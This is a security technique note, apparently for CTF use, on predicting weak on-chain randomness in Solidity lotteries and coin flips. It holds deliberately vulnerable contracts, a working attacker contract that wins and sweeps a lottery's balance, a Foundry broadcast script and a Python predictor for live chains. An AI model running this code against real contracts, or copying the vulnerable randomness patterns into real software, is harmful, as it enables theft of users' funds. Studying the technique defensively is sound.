---
title: "Bad Randomness - Predicting block.timestamp, blockhash and prevrandao"
category: blockchain
subcategory: randomness
type: technique
tags: [blockchain, randomness, prng, block-timestamp, blockhash, prevrandao, difficulty, keccak256, same-block, lottery, solidity, evm, chainlink-vrf, commit-reveal, foundry, cast, seed]
difficulty: easy
summary: "On-chain entropy is public. Compute the same hash in your attacker contract in the same block and always win."
when_to_use:
  - "A lottery/coinflip/mint uses keccak256 of block data as a random number"
  - "You see block.timestamp, block.number, blockhash, block.prevrandao or blockhash(block.number)"
  - "A 'secret' seed is stored in a private variable"
  - "The winner is decided in the same transaction you can call"
tools: [foundry, cast, web3py, chisel]
related: [storage-slot-reading, attacker-contract-patterns, evm-bytecode-and-create2, solidity-vuln-checklist]
---

## TL;DR

There is no private state and no secret entropy in the EVM. Anything a contract can hash, your
contract can hash too, in the same block, before deciding whether to commit. Compute the outcome
first; revert if you would lose.

## Recognise it

- `uint256 r = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));`
- `blockhash(block.number)` - **always returns 0**, so the "random" number is a constant.
- `blockhash(block.number - 1)` - readable by you in the same block.
- `block.prevrandao` (post-Merge; was `block.difficulty`) - a value that is *known* at the start of
  the block and identical for every transaction in it.
- `uint256 private seed;` used as entropy - readable via `eth_getStorageAt`.
- `now % 10 == 0`, `block.number % 2`, `address(this).balance % n`.
- A commit-reveal where the reveal is in the same block, or where the commit is not hashed with a
  salt.
- Chainlink VRF used but the callback is not access-controlled (anyone can call `fulfillRandomWords`).

## Theory

### What each source actually is

| Source | Known before the tx? | Miner/validator controllable? |
|---|---|---|
| `block.timestamp` | yes (within ~12s) | yes, within a few seconds |
| `block.number` | yes | trivially |
| `blockhash(block.number)` | n/a - returns `0x0` | n/a |
| `blockhash(block.number - 1)` | yes, fully public | no, but predictable |
| `blockhash(n)` for `n < block.number - 256` | returns `0x0` | n/a |
| `block.prevrandao` | yes, fixed for the whole block | validator can bias by 1 bit per slot (skip) |
| `block.coinbase`, `gasleft()`, `tx.gasprice` | yes | yes |
| a stored `seed` | yes via `eth_getStorageAt` | n/a |
| `keccak256(abi.encodePacked(msg.sender, nonce))` | yes | yes - grind `msg.sender` with CREATE2 |

The only safe sources in practice: Chainlink VRF, RANDAO with a delay of several epochs plus
commit-reveal, or a threshold beacon (drand).

### The same-block attack

Solidity gives you no way to know the *future*, but the vulnerable contract does not use the future
either. It uses values available at the start of the block. So:

1. Your attacker contract is called in block `N`.
2. It reads exactly the same globals the victim would read.
3. It computes the winning guess.
4. It calls the victim in the same transaction - the globals are identical.

Even if the victim adds `msg.sender` to the hash, your contract address is a fixed input you know.
If the victim adds a per-user nonce, you read it. If it blocks contracts with
`require(msg.sender == tx.origin)`, run the attack from a **constructor** (see
`attacker-contract-patterns`) or grind a `CREATE2` salt so the address itself yields a win.

### Reverting to avoid losses

If you must pay to play, compute first and `revert()` when you would lose. The gas is spent but the
stake is refunded. `try/catch` around the victim call lets you keep going.

## Attack

1. Copy the victim's exact hash expression into your contract.
2. Match the `abi.encodePacked` vs `abi.encode` choice, the types and the order precisely - a
   single `uint8` vs `uint256` difference changes the hash.
3. Make sure your contract is the `msg.sender` the victim sees (no intermediary).
4. If you need many wins, loop inside a single call, or use `--slow` across blocks.

## Code

### Vulnerable lottery

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968; // 2**255

    /// BUG: blockhash(block.number - 1) is public information
    function flip(bool guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(lastHash != blockValue, "one flip per block");
        lastHash = blockValue;

        bool side = blockValue / FACTOR == 1;
        if (side == guess) {
            consecutiveWins++;
            return true;
        }
        consecutiveWins = 0;
        return false;
    }
}

contract Lottery {
    uint256 public pot;
    uint256 private nonce;

    constructor() payable {
        pot = msg.value;
    }

    /// BUG: every input is public at the time the transaction executes
    function play(uint256 guess) external payable {
        require(msg.value == 0.1 ether, "ticket is 0.1 ether");
        uint256 r = uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.prevrandao, msg.sender, nonce++)
            )
        ) % 100;
        if (r == guess) {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "payout failed");
        }
    }

    function currentNonce() external view returns (uint256) {
        return nonce;
    }

    receive() external payable {}
}
```

### Attacker

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

interface ILottery {
    function play(uint256 guess) external payable;
    function currentNonce() external view returns (uint256);
}

contract RandomnessAttacker {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    /// One call per block; run it 10 times to reach 10 consecutive wins.
    function flipOnce(address coinflip) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1;
        require(ICoinFlip(coinflip).flip(side), "lost -- impossible");
    }

    /// Recompute the victim's PRNG with msg.sender == address(this).
    function winLottery(address payable lottery) external payable {
        uint256 n = ILottery(lottery).currentNonce();
        uint256 guess = uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.prevrandao, address(this), n)
            )
        ) % 100;
        ILottery(lottery).play{value: 0.1 ether}(guess);
        require(address(this).balance > 0, "did not win");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
```

### Same-block driver (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {RandomnessAttacker} from "../src/RandomnessAttacker.sol";

interface ICoinFlip { function consecutiveWins() external view returns (uint256); }

contract FlipTenTimes is Script {
    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address coinflip = vm.envAddress("TARGET");

        vm.startBroadcast(pk);
        RandomnessAttacker a = new RandomnessAttacker();
        // one flip per block: broadcast with --slow so each tx lands separately
        for (uint256 i = 0; i < 10; i++) {
            a.flipOnce(coinflip);
        }
        vm.stopBroadcast();
        console2.log("wins:", ICoinFlip(coinflip).consecutiveWins());
    }
}
```

```bash
# --slow forces one transaction per block, which the 'one flip per block' guard requires
forge script script/FlipTenTimes.s.sol:FlipTenTimes \
  --rpc-url "$RPC_URL" --broadcast --slow --legacy -vvv
```

### Reading a "secret" seed and predicting offline

```python
#!/usr/bin/env python3
"""Predict a keccak-based on-chain PRNG. pip install web3 eth-utils"""
import os
import sys

from eth_abi.packed import encode_packed
from eth_utils import keccak, to_checksum_address
from web3 import Web3


def predict(timestamp: int, prevrandao: int, sender: str, nonce: int) -> int:
    """Mirror of keccak256(abi.encodePacked(uint256,uint256,address,uint256)) % 100."""
    packed = encode_packed(
        ["uint256", "uint256", "address", "uint256"],
        [timestamp, prevrandao, to_checksum_address(sender), nonce],
    )
    return int.from_bytes(keccak(packed), "big") % 100


if __name__ == "__main__":
    # self-test: the function is deterministic and stays in range
    v = predict(1700000000, 12345, "0x000000000000000000000000000000000000dEaD", 0)
    assert 0 <= v < 100
    assert v == predict(1700000000, 12345, "0x000000000000000000000000000000000000dEaD", 0)
    print(f"[+] self-test ok, sample prediction = {v}")

    rpc = os.environ.get("RPC_URL")
    if not rpc:
        print("set RPC_URL to predict against a live chain")
        raise SystemExit(0)

    w3 = Web3(Web3.HTTPProvider(rpc))
    blk = w3.eth.get_block("latest")
    sender = sys.argv[1] if len(sys.argv) > 1 else "0x000000000000000000000000000000000000dEaD"
    # NOTE: the NEXT block's timestamp is what the victim will see; on a dev chain it is
    # usually parent + 1s, so try a small window.
    for delta in range(0, 5):
        guess = predict(blk["timestamp"] + delta, blk.get("prevRandao", 0) or 0, sender, 0)
        print(f"timestamp +{delta}: guess = {guess}")
```

## Variants & pitfalls

- **`abi.encodePacked` vs `abi.encode`** produce different hashes. Copy the victim exactly.
  `encodePacked` with two dynamic types is also ambiguous - a separate bug class.
- **`block.difficulty` on a post-Merge chain** is `prevrandao` and is a huge number, not ~10^13.
  A check like `block.difficulty > X` behaves differently after the Merge.
- **`blockhash(block.number)` is zero.** So `uint256(blockhash(block.number)) % n == 0` - the
  answer is always 0. Look for this; it is a free win.
- **256-block window**: `blockhash` returns `0x0` for blocks older than 256. A commit-reveal that
  uses `blockhash(commitBlock + 1)` can be *forced* to zero by waiting 256 blocks, making the
  outcome deterministic.
- **`require(msg.sender == tx.origin)`** blocks the contract approach - attack from a constructor,
  or use `CREATE2` to mine an address that wins (see `attacker-contract-patterns`).
- **Per-user salt = grind the address**: if the seed includes `msg.sender`, deploy via `CREATE2`
  with a mined salt so your address produces the winning hash.
- **Validator bias on `prevrandao`** is only ~1 bit per slot and irrelevant in a CTF; the
  predictability is the bug, not the bias.
- **Chainlink VRF misuse**: `fulfillRandomWords` must be `onlyCoordinator`. If it is `public`,
  call it yourself with the words you want.
- **Off-chain oracle with a signature**: see `signature-replay-malleability`.

## Tools

- `cast block latest` - read `timestamp`, `mixHash`/`prevRandao`, `number`.
- `cast keccak $(cast abi-encode ...)` / `chisel` to reproduce the hash by hand.
- `forge script --slow` for one-tx-per-block sequences.

## References

- Solidity docs: "Block and Transaction Properties" (notes that miners can influence these).
- EIP-4399: `DIFFICULTY` becomes `PREVRANDAO`.
